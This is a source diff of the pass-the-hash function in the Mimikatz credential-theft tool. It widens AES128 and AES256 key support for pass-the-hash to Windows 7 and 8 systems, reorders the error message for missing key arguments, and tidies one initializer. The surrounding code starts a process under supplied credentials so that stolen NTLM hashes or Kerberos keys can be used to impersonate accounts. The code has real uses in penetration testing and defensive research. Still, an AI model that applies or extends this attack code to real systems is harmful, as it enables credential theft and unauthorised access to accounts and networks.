@@ -429,7 +429,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 {
 	BYTE ntlm[LM_NTLM_HASH_LENGTH], aes128key[AES_128_KEY_LENGTH], aes256key[AES_256_KEY_LENGTH];
 	TOKEN_STATISTICS tokenStats;
-	SEKURLSA_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, NULL, FALSE};
+	SEKURLSA_PTH_DATA data = {&tokenStats.AuthenticationId, NULL, NULL, NULL, FALSE};
 	PCWCHAR szUser, szDomain, szRun, szNTLM, szAes128, szAes256;
 	DWORD dwNeededSize;
 	HANDLE hToken;
@@ -444,7 +444,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 
 			if(kull_m_string_args_byName(argc, argv, L"aes128", &szAes128, NULL))
 			{
-				if(MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
+				if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
 				{
 					if(kull_m_string_stringToHex(szAes128, aes128key, AES_128_KEY_LENGTH))
 					{
@@ -453,12 +453,12 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 					}
 					else PRINT_ERROR(L"AES128 key length must be 32 (16 bytes)\n");
 				}
-				else PRINT_ERROR(L"AES128 key only supported from Windows 8.1\n");
+				else PRINT_ERROR(L"AES128 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
 			}
 
 			if(kull_m_string_args_byName(argc, argv, L"aes256", &szAes256, NULL))
 			{
-				if(MIMIKATZ_NT_BUILD_NUMBER > KULL_M_WIN_MIN_BUILD_BLUE)
+				if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
 				{
 					if(kull_m_string_stringToHex(szAes256, aes256key, AES_256_KEY_LENGTH))
 					{
@@ -467,7 +467,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 					}
 					else PRINT_ERROR(L"AES256 key length must be 64 (32 bytes)\n");
 				}
-				else PRINT_ERROR(L"AES256 key only supported from Windows 8.1\n");
+				else PRINT_ERROR(L"AES256 key only supported from Windows 8.1 (or 7/8 with kb2871997)\n");
 			}
 
 			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
@@ -479,8 +479,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 				}
 				else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
 			}
-			else if(!(data.Aes128Key || data.Aes256Key)) PRINT_ERROR(L"Missing argument : ntlm\n");
-			
+						
 			if(data.NtlmHash || data.Aes128Key || data.Aes256Key)
 			{
 				if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, szUser, szDomain, L"", &processInfos, FALSE))
@@ -513,6 +512,7 @@ NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[])
 				}
 				else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
 			}
+			else PRINT_ERROR(L"Missing at least one argument : ntlm OR aes128 OR aes256\n");
 		}
 		else PRINT_ERROR(L"Missing argument : domain\n");
 	}
